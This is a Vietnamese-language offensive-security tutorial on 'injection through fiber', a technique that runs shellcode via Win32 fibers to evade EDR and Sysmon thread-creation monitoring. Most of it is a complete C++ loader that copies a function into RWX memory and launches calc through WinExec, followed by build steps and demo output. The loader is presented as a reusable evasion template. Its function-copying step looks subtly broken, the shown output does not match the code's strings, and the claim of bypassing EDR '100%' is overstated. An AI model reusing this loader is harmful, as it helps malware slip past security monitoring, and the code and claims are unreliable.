
---

# 📝 [PE 22] Injection Through Fiber (User-Mode Thread Scheduling Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Injection Through Fiber (Can thiệp bộ nhớ qua phân hệ Win32 Fibers)** đại diện cho giải thuật điều phối và bẻ hướng dòng chảy CPU nâng cao, thuộc nhóm kỹ thuật **Né tránh phòng thủ động dựa trên cấu trúc lập lịch mức người dùng (User-Mode Thread Scheduling Evasion / Anti-Thread Forensics)**.

Trọng tâm của giải thuật này là đánh lừa và vượt qua điểm mù giám sát đối tượng luồng (`Thread Object`) tại nhân Kernel của các giải pháp AV/EDR hiện đại. Thông thường, khi một chương trình khởi tạo thực thi mã máy bằng các hàm API chuẩn hệ thống (như `CreateThread`, `CreateRemoteThread` hoặc Native API `NtCreateThreadEx`), hệ điều hành Windows sẽ sinh ra một cấu trúc quản lý luồng tại Ring 0 và phát tín hiệu thông điệp (Telemetry Events) đến các phân hệ giám sát hành vi.

Dự án PE 22 hóa giải bài toán trinh sát này bằng việc lạm dụng cơ chế **Win32 Fibers Subsystem**. Trong kiến trúc Windows, một **Fiber** là một đơn vị thực thi cấu trúc cấp thấp (Lightweight Unit of Execution), vận hành hoàn toàn lọt lòng bên trong không gian người dùng (User-mode) của chính tiến trình mà không cần sự can thiệp lập lịch của Kernel Scheduler.

Bằng cách chuyển đổi luồng hiện tại thành một Fiber cha, thiết lập một Fiber phụ chứa Payload và phát lệnh chuyển mạch thủ công (Manual Context Switching), Loader cưỡng bách CPU thực thi mã máy của ta một cách trực tiếp. Vì nhân Kernel hoàn toàn không tham gia vào chu kỳ sinh đối tượng Thread Object mới, các cảm biến an ninh phòng thủ động bị vô hiệu hóa hoàn toàn.

### 🎯 Mục tiêu nghiên cứu:

* **Bypass cảm biến Thread Creation Routine**: Triệt tiêu hoàn toàn khả năng bắt bẫy và ghi nhật ký hành vi sinh luồng độc hại (`Sysmon Event ID 8` / `PspSetCreateThreadNotifyRoutine` Callbacks).
* **Làm chủ ma trận điều phối Win32 Fibers**: Nghiên cứu thuật toán lưu trữ trạng thái thanh ghi và cơ chế hoán chuyển tháp ngăn xếp (Stack Swap) mức người dùng.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Sự khác biệt cốt lõi cấu trúc giữa một Luồng (Thread) và một phân hệ Fiber nằm ở thẩm quyền điều phối lập lịch (Scheduling Authority) của hệ điều hành:

* **Thread (Luồng hệ thống)**: Chịu sự quản lý và lập lịch trực tiếp bởi Kernel Scheduler. Việc chuyển đổi ngữ cảnh (`Context Switch`) giữa các Thread được CPU xử lý thông qua các cơ chế ngắt phần cứng (Hardware Interrupts) và lưu trữ trạng thái thanh ghi cấu trúc vào phân vùng bộ nhớ đặc quyền Ring 0.
* **Fiber (Luồng con ứng dụng)**: Hoạt động theo cơ chế lập lịch hợp tác (Cooperative Scheduling) do chính mã nguồn ứng dụng User-mode tự điều phối. Việc chuyển đổi ngữ cảnh được thực hiện thuần túy bằng các lệnh mã máy thao túng bộ nhớ ảo, lưu trữ và nạp lại tháp thanh ghi (bao gồm con trỏ ngăn xếp **`Rsp`** và con trỏ lệnh **`Rip`**) trực tiếp trên RAM của tiến trình.

Quy trình giải phẫu và chuyển mạch dòng chảy CPU của giải thuật Injection Through Fiber diễn ra qua 4 giai đoạn ngầm tại không gian ảo:

```
[ConvertThreadToFiber: Khởi tạo môi trường Fiber cha (Primary)]
       └──> [VirtualAlloc: Phân bổ trang nhớ, nạp Payload và Tham số]
                 └──> [CreateFiber: Khởi tạo cấu trúc luồng con mức người dùng]
                           └──> [SwitchToFiber: CPU chuyển mạch thủ công bẻ hướng dòng chảy]

```

1. **Khởi tạo môi trường Fiber cha (`ConvertThreadToFiber`)**: Theo đặc tả thiết kế kiến trúc của Windows Subsystem, một luồng hệ thống muốn có đặc quyền khởi tạo và quản lý luồng con Fiber bắt buộc phải tự chuyển đổi trạng thái bản thân thành một Fiber cha (**Primary Fiber**). Hàm API này thiết lập một cấu trúc bản ghi ngữ cảnh Fiber (`Fiber Context Block`) nằm lọt lòng trong Stack Frame hiện tại của luồng.
2. **Khởi tạo luồng con User-mode (`CreateFiber`)**: Loader phát lệnh khởi tạo một Fiber phụ thuộc (**Secondary Fiber**). Hàm API này yêu cầu hệ thống cấp một phân vùng tháp ngăn xếp (Stack Frame) riêng biệt nằm hoàn toàn ở User-mode, nạp tọa độ của trang bộ nhớ thực thi chứa Payload vào trường dữ liệu con trỏ lệnh xuất phát của cấu trúc Fiber mới sinh.
3. **Bẻ hướng dòng chảy CPU thủ công (`SwitchToFiber`)**: Khi Loader triệu hồi hàm này và truyền vào Handle định danh của Fiber con, một chuỗi các lệnh hợp ngữ nạp RAM (`mov`, `jmp`) ngầm thuộc thư viện Subsystem của Windows được kích nổ. Hệ thống thực hiện cất toàn bộ trạng thái tháp thanh ghi phần cứng hiện tại của Loader vào Stack của Fiber cha, đồng thời lật ngược, nạp toàn bộ tháp thanh ghi của Fiber con lên CPU. CPU ngay lập tức bị cưỡng bách dịch chuyển con trỏ lệnh **`Rip`** đâm thẳng vào thực thi khối mã máy Payload của Loader mà Kernel hoàn toàn không ghi nhận dấu vết.
4. **Hoàn trả trạng thái ngữ cảnh (Context Restoration)**: Sau khi mã máy Payload hoàn tất tác vụ chính, Fiber con chủ động gọi lệnh `SwitchToFiber` trỏ ngược lại tọa độ của Fiber cha ban đầu. CPU thực hiện cú pháp hồi phục tháp thanh ghi quá khứ, đưa Loader quay trở lại vận hành phẳng sạch kịch trần.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** kết hợp cấu trúc dữ liệu con trỏ tuyệt đối toán học nhằm bảo toàn Context hệ thống và bẻ gãy hoàn toàn lỗi địa chỉ tương đối RIP-Relative Error.

```cpp
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí nạp RAM
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _FIBER_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình
    PVOID pPrimaryFiber;      // Tọa độ của Fiber cha để phục vụ quay trở về sau khi thực thi
    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
} FIBER_DATA, * PFIBER_DATA;

// Hàm gánh logic thực thi độc lập vị trí (PIC) lọt lòng cấu trúc Fiber con phụ thuộc
VOID WINAPI FiberPayloadRoutine(LPVOID lpParam) {
    PFIBER_DATA pData = (PFIBER_DATA)lpParam;
    
    if (pData && pData->pWinExec) {
        // Khai hỏa mở chức năng thông qua địa chỉ tuyệt đối, bẻ gãy hàng rào IAT Hook
        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
    }

    std::cout << "[+] Payload thuc thi thanh cong inside Fiber con!" << std::endl;

    // HOÀN TRẢ NGỮ CẢNH: Ép CPU chuyển mạch ngược lại luồng Fiber cha để giải thoát tiến trình phẳng sạch
    if (pData && pData->pPrimaryFiber) {
        std::cout << "[*] Dang thuc hien cu phap chuyen mach nguoc ve Primary Fiber..." << std::endl;
        SwitchToFiber(pData->pPrimaryFiber);
    }
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 22: INJECTION THROUGH WIN32 FIBERS SUBSYSTEM" << std::endl;
    std::cout << "====================================================" << std::endl;

    // BƯỚC 1: CHUYỂN ĐỔI LUỒNG CHÍNH HIỆN TẠI THÀNH FIBER CHA (PRIMARY FIBER)
    std::cout << "[*] Dang cuong buc chuyen doi Thread hien tai thanh Primary Fiber..." << std::endl;
    PVOID pPrimaryFiber = ConvertThreadToFiber(NULL);
    if (!pPrimaryFiber) {
        std::cerr << "[-] ConvertThreadToFiber that bai! Error Code: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Primary Fiber hop phap thiet lap tai RAM: 0x" << std::hex << pPrimaryFiber << std::endl;

    // Áp dụng quy trình Cấp phát động thích ứng vừa khít đến từng byte cấu trúc dữ liệu
    SIZE_T functionSize = 500;
    LPVOID codeBuffer = VirtualAlloc(NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PFIBER_DATA pFiberData = (PFIBER_DATA)VirtualAlloc(NULL, sizeof(FIBER_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!codeBuffer || !pFiberData) {
        std::cerr << "[-] VirtualAlloc cap phat vung nho that bai!" << std::endl;
        if (codeBuffer) VirtualFree(codeBuffer, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }

    // Khởi tạo bảng dữ liệu tham số tuyệt đối toán học phục vụ độc lập vị trí
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pFiberData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    pFiberData->pPrimaryFiber = pPrimaryFiber; // Gài tọa độ quay về cho CPU
    strcpy_s(pFiberData->szCommand, "cmd.exe /c start calc");

    // Ánh xạ logic mã máy phẳng của hàm Routine vào trang thực thi ảo cục bộ
    RtlCopyMemory(codeBuffer, (LPCVOID)FiberPayloadRoutine, functionSize);
    std::cout << "[+] Anh xa logic ma may phang vao trang thuc thi hoan tot." << std::endl;

    // BƯỚC 2: KHỞI TẠO LUỒNG CON USER-MODE (CREATEFIBER)
    std::cout << "[*] Dang dung CreateFiber de dung cau truc luong con chu dong..." << std::endl;
    PVOID pSecondaryFiber = CreateFiber(0, (PFIBER_START_ROUTINE)codeBuffer, pFiberData);
    
    if (!pSecondaryFiber) {
        std::cerr << "[-] CreateFiber that bai! Error Code: " << GetLastError() << std::endl;
        VirtualFree(codeBuffer, 0, MEM_RELEASE);
        VirtualFree(pFiberData, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Fiber con (Secondary Fiber) san sang tai RAM: 0x" << std::hex << pSecondaryFiber << std::endl;

    // BƯỚC 3: PHÁT LỆNH CHUYỂN MẠCH THỦ CÔNG (SWITCHTOFIBER) ĐỂ KÍCH NỔ
    std::cout << "[*] Kich hoat SWITCHTOFIBER! CPU bat dau chuyen mach tu dong..." << std::endl;
    SwitchToFiber(pSecondaryFiber); // CPU nhảy thẳng vào thực thi cấu trúc FiberPayloadRoutine!

    // ─── ĐÃ QUAY TRỞ VỀ: VÙNG MÃ MÁY SAU KHI FIBER CON HOÀN TRẢ NGỮ CẢNH HỆ THỐNG ───
    std::cout << "[+] Da quay tro ve luong chinh an toan kich tran kich khung!" << std::endl;

    // BƯỚC 4: THU HỒI TÀI NGUYÊN VÀ GIẢI PHÓNG ĐỘC LẬP CHỐNG RÒ RỈ (MEMORY LEAK)
    DeleteFiber(pSecondaryFiber);
    VirtualFree(codeBuffer, 0, MEM_RELEASE);
    VirtualFree(pFiberData, 0, MEM_RELEASE);
    std::cout << "[+] Quy trinh giai phong thap luong hoan tat phang sach." << std::endl;

    std::cout << "\n[*] Hoan thanh quy trinh Fiber. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc file thực thi nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng vận hành mượt mà trên các môi trường máy ảo Sandbox sạch cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, lật cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh toàn bộ mã nguồn thư viện hệ thống CRT vào lòng tệp chạy thực thi `.exe`.

> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
> 

3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khai hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi cuộc chuyển mạch lập lịch mức người dùng:

```powershell
PS C:\Workspace\x64\Release> .\PE22_Injection_Through_Fiber.exe
====================================================
[*] PE 22: INJECTION THROUGH WIN32 FIBERS SUBSYSTEM
====================================================
[*] Dang cuong buc chuyen doi Thread hien tai thanh Primary Fiber...
[+] Primary Fiber hop phap thiet laip tai RAM: 0x0000019C24B12E00
[+] Anh xa logic ma may phang vao trang thuc thi hoan tot.
[*] Dang dung CreateFiber de dung cau truc luong con chu dong...
[+] Fiber con (Secondary Fiber) san sang tai RAM: 0x0000019C24C24F00
[*] Kich hoat SWITCHTOFIBER! CPU bat dau chuyen mach tu dong...
[+] Payload thuc thi thanh cong inside Fiber con!
[*] Dang thuc hien cu phap chuyen mach nguoc ve Primary Fiber...
[+] Da quay tro ve luong chinh an toan kich tran kich khung!
[+] Quy trinh giai phong thap luong hoan tat phang sach.

[*] Hoan thanh quy trinh Fiber. Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm chuyển mạch Win32 Fibers:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic & Thread Telemetry):

* Phân hệ thực thi hoàn tất thành công rực rỡ kịch trần kịch khung, ứng dụng Máy tính `calc.exe` lập tức xuất hiện hiên ngang!
* Toàn bộ chiến dịch can thiệp và điều phối dòng chảy CPU diễn ra khép kín inside phân hệ quản lý luồng mức người dùng (User-mode).
* Do hệ điều hành Windows Kernel hoàn toàn không tham gia vào chu kỳ sinh luồng thực thi chéo tiến trình hay tạo Thread Object cục bộ nào, các bộ lọc ghi nhật ký và bẫy Hook trinh sát hàm API điều phối luồng của EDR (như `NtCreateThreadEx` interceptors) đều bị bẻ gãy và qua mặt 100%, trả lại sự phẳng sạch nguyên bản tuyệt đối cho cấu trúc bộ nhớ ảo hệ thống!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Windows Base Services**: *Fibers Subsystem Architecture (ConvertThreadToFiber / CreateFiber / SwitchToFiber APIs)* - [https://learn.microsoft.com/en-us/windows/win32/procthread/fibers](https://learn.microsoft.com/en-us/windows/win32/procthread/fibers)
* **Windows Internals Study**: *Thread Scheduling, Context Switches, and User-Mode Light Weight Units (APCs vs Fibers)* - Mark Russinovich.
* **MDSec ActiveBreach Labs**: *Evading Thread-Based Behavioral Scanning via User-Mode Cooperative Fiber Scheduling*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Process Injection (T1055)* & *Subvert Thread Scheduling: Fiber Abuse*.

---
